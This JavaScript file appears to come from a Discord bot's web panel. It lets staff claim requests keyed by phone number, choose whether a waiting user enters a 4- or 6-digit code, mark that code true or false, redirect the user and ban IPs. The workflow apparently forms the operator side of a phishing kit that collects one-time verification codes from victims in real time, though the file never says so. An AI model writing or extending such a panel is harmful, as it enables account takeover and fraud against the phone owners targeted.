/**
 * web/actions.js — the same 7 staff actions as buttons.js, triggered from
 * the web panel instead of a Discord button.
 *
 * "No conflict" with Discord comes from calling the exact same backend:
 *   - callStaffAction()/callBanIP() (utils/api.js) is the real arbiter —
 *     the Vercel API enforces claim locking server-side no matter which
 *     client (Discord or web) asked, so two staff racing a claim from
 *     different sides get the same correct outcome as two staff racing it
 *     from two Discord clicks.
 *   - claimStore.js / messageStore.js are updated here exactly like
 *     buttons.js updates them, so the Discord bot's own in-memory fast-path
 *     (peekClaimer) never goes stale just because the claim happened here.
 *   - The Discord channel embed is refreshed here too (mirroring buttons.js'
 *     wording/colors), so Discord-side staff see a web action just like a
 *     Discord one — nobody has to alt-tab to find out what happened.
 *   - broadcastRequestUpdate/-Removed then tells every other open dashboard
 *     tab, live.
 *
 * KNOWN GAP: unlike buttons.js, this does NOT edit the claimer's personal
 * Discord DM when true_code/false_code is triggered from the web (there's
 * no stored reference to that DM message here). Its buttons simply go
 * stale — clicking one after the fact just gets a normal "already handled"
 * error from the API, nothing breaks, it's just not visually updated.
 */

import { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } from "discord.js";
import { getRequestByPhone } from "../database.js";
import { getOperatorColor } from "../utils/colors.js";
import { callStaffAction, callBanIP } from "../utils/api.js";
import { setClaimer, clearClaimer, getClaimer, peekClaimer } from "../utils/claimStore.js";
import { recallMessage, forgetMessage } from "../utils/messageStore.js";
import { broadcastRequestUpdate, broadcastRequestRemoved } from "./broadcast.js";

function pingUser(userId) {
    return `<@${userId}>`;
}

function buildPostClaimRow(phone) {
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId("len4_"    + phone).setLabel("🔢 4 digits").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("len6_"    + phone).setLabel("🔢 6 digits").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("wrong_"   + phone).setLabel("❌ Wrong Number").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("unclaim_" + phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary),
    );
}

async function refreshChannelMessage(client, phone, build) {
    let loc = null;
    try { loc = await recallMessage(phone); }
    catch (e) { console.warn(`⚠️  [web] Could not look up the channel message for ${phone}:`, e.message); }
    if (!loc) return;
    try {
        const channel = await client.channels.fetch(loc.channelId);
        const message = await channel.messages.fetch(loc.messageId);
        await message.edit(build(message));
    } catch (e) {
        console.warn(`⚠️  [web] Could not refresh channel message for ${phone}:`, e.message);
    }
}

/** null = allowed. Otherwise the Discord user ID who actually holds the claim. */
async function unauthorizedClaimer(phone, staffUser, ownerBypass) {
    if (ownerBypass) return null;
    let claimer = null;
    try { claimer = await getClaimer(phone); }
    catch { return null; } // DB down — let the API's own guard decide, same policy as buttons.js
    if (!claimer || claimer === staffUser.id) return null;
    return claimer;
}

// ─── Actions ──────────────────────────────────────────────────────────────────

export async function webClaim(client, phone, staffUser) {
    const known = peekClaimer(phone);
    if (known && known !== staffUser.id) {
        return { success: false, message: `Already claimed by <@${known}>.` };
    }

    const data = await callStaffAction("claim", phone, staffUser.username, null, staffUser.id);
    if (!data.success) return { success: false, message: data.message };

    setClaimer(phone, staffUser.id);
    let row = null;
    try { row = await getRequestByPhone(phone); } catch (e) { console.warn("⚠️  [web] Could not reload row after claim:", e.message); }

    await refreshChannelMessage(client, phone, (msg) => {
        const embed = EmbedBuilder.from(msg.embeds[0])
            .setTitle("📋 Request In Progress")
            .setDescription(
                `👤 Claimed by <@${staffUser.id}>\n` +
                `⏰ Claimed <t:${Math.floor(Date.now() / 1000)}:R>\n\n` +
                `**🔧 Choose an action:**`
            );
        if (row) embed.setColor(getOperatorColor(row.operator));
        return { content: pingUser(staffUser.id), embeds: [embed], components: [buildPostClaimRow(phone)] };
    });

    broadcastRequestUpdate(row || { phone }, { status: "processing", claimedByDiscordId: staffUser.id });
    return { success: true, row };
}

export async function webSetLength(client, phone, length, staffUser, ownerBypass) {
    const other = await unauthorizedClaimer(phone, staffUser, ownerBypass);
    if (other) return { success: false, message: `Claimed by <@${other}> — only they can act on it.` };

    const data = await callStaffAction("set_length", phone, staffUser.username, length);
    if (!data.success) return { success: false, message: data.message };

    await refreshChannelMessage(client, phone, (msg) =>
        ({
            content: pingUser(staffUser.id),
            embeds: [
                EmbedBuilder.from(msg.embeds[0])
                    .setColor(0x10b981).setTitle(`⏳ Awaiting Code (${length} digits)`)
                    .setDescription(
                        `👤 Claimed by <@${staffUser.id}>\n` +
                        `🔢 Requested code: \`${length} digits\`\n` +
                        `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n` +
                        `*Waiting for the user to enter it…*`
                    ),
            ],
            components: [],
        })
    );

    broadcastRequestUpdate({ phone }, { status: "waiting_code", codeLength: length, claimedByDiscordId: staffUser.id });
    return { success: true };
}

export async function webWrongNumber(client, phone, staffUser, ownerBypass) {
    const other = await unauthorizedClaimer(phone, staffUser, ownerBypass);
    if (other) return { success: false, message: `Claimed by <@${other}> — only they can act on it.` };

    const data = await callStaffAction("wrong_number", phone, staffUser.username);
    if (!data.success) return { success: false, message: data.message };

    clearClaimer(phone);
    forgetMessage(phone);

    await refreshChannelMessage(client, phone, (msg) =>
        ({
            content: pingUser(staffUser.id),
            embeds: [
                EmbedBuilder.from(msg.embeds[0])
                    .setColor(0xef4444).setTitle("❌ Wrong Number")
                    .setDescription(`❌ The user is being redirected to re-enter their number.\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`),
            ],
            components: [],
        })
    );

    broadcastRequestRemoved(phone);
    return { success: true };
}

export async function webUnclaim(client, phone, staffUser, ownerBypass, accessRoleId) {
    const other = await unauthorizedClaimer(phone, staffUser, ownerBypass);
    if (other) return { success: false, message: `Claimed by <@${other}> — only they can act on it.` };

    const data = await callStaffAction("unclaim", phone, staffUser.username);
    if (!data.success) return { success: false, message: data.message };

    clearClaimer(phone);

    await refreshChannelMessage(client, phone, (msg) =>
        ({
            content: accessRoleId ? `<@&${accessRoleId}>` : "",
            embeds: [
                EmbedBuilder.from(msg.embeds[0])
                    .setColor(0x6b7280).setTitle("📭 Request Unclaimed")
                    .setDescription(`↩️ Unclaimed by <@${staffUser.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nBack in the waiting queue.`),
            ],
            components: [new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId("claim_" + phone).setLabel("📋 Claim").setStyle(ButtonStyle.Primary)
            )],
        })
    );

    broadcastRequestUpdate({ phone }, { status: "pending", claimedByDiscordId: null, codeLength: null, staffCode: null });
    return { success: true };
}

export async function webTrueCode(client, phone, staffUser, ownerBypass) {
    const other = await unauthorizedClaimer(phone, staffUser, ownerBypass);
    if (other) return { success: false, message: `Claimed by <@${other}> — only they can act on it.` };

    const data = await callStaffAction("true_code", phone, staffUser.username);
    if (!data.success) return { success: false, message: data.message };

    clearClaimer(phone);

    await refreshChannelMessage(client, phone, (msg) =>
        ({
            content: pingUser(staffUser.id),
            embeds: [
                EmbedBuilder.from(msg.embeds[0])
                    .setColor(0x10b981).setTitle("✅ Code Validated!")
                    .setDescription(`👤 Validated by <@${staffUser.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nThe user is being redirected to the success page.`),
            ],
            components: [],
        })
    );

    forgetMessage(phone);
    broadcastRequestRemoved(phone);
    return { success: true };
}

export async function webFalseCode(client, phone, staffUser, ownerBypass) {
    const other = await unauthorizedClaimer(phone, staffUser, ownerBypass);
    if (other) return { success: false, message: `Claimed by <@${other}> — only they can act on it.` };

    const data = await callStaffAction("false_code", phone, staffUser.username);
    if (!data.success) return { success: false, message: data.message };

    await refreshChannelMessage(client, phone, (msg) =>
        ({
            content: pingUser(staffUser.id),
            embeds: [
                EmbedBuilder.from(msg.embeds[0])
                    .setColor(0xf59e0b).setTitle("🔄 Code Rejected — New Length?")
                    .setDescription(
                        `👤 Claimed by <@${staffUser.id}>\n` +
                        `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n` +
                        `⚠️ The previous code was **incorrect**.\n` +
                        `The user is waiting on the validation page.\n\n` +
                        `**Choose the length of the next code:**`
                    ),
            ],
            components: [buildPostClaimRow(phone)],
        })
    );

    broadcastRequestUpdate({ phone }, { status: "retry_code", claimedByDiscordId: staffUser.id, staffCode: null, codeLength: null });
    return { success: true };
}

/** Owner-only — enforced by the route, not here (mirrors /banip being owner-only in slash.js). */
export async function webBanIp(ip, staffUser) {
    const data = await callBanIP(ip, staffUser.username);
    return data.success ? { success: true } : { success: false, message: data.message };
}
